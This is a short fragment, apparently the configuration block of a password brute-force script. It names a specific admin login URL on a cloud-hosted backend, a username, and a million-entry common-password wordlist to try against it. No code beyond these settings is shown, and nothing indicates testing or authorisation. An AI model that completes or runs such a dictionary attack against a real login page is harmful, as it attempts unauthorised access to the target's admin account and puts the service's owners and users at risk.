...
TARGET_URL = 'https://hptmadv-backend-151894956919.us-central1.run.app/api/admin/login/?next=/api/admin'
USERNAME = '1153039463'
WORDLIST = 'Passwords/Passwords/10_million_password_list_top_1000000.txt'
